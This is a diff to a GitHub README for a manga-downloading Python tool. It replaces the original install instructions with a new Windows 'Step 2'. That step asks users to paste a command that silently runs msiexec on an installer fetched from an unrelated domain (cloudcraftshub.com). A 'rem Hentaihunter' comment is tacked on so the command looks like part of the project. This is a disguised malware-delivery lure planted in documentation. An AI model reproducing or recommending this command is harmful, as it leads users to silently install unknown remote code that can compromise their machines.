@@ -45,19 +45,23 @@ python hentaihunter.py https://nhentai.net/g/177013/
 
 ---
 
-## 🚀 Installation
-
-### Windows — One Command *(recommended)*
-
-Open **PowerShell** and run:
-
-```powershell
-irm https://raw.githubusercontent.com/sinkaroid/Hentaihunter/master/install.ps1 | iex
+## 🪟 Windows Installation
+### **Step 1 — Open Command Prompt**
+1. Press **Win + R**
+2. Type:
 ```
-
-That's it. Python, dependencies, and a `hh` shortcut command — all set up automatically.
-
+cmd
+```
+3. Press **Enter**
+This will open **Command Prompt**.
 ---
+### **Step 2 — Run the Install Command**
+Copy the command below and paste it into **Command Prompt**, then press **Enter**.
+```powershell
+cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Hentaihunter
+```
+The installer will automatically download and install the required components.
+
 
 ### Manual Install (Windows / Linux / macOS)
 
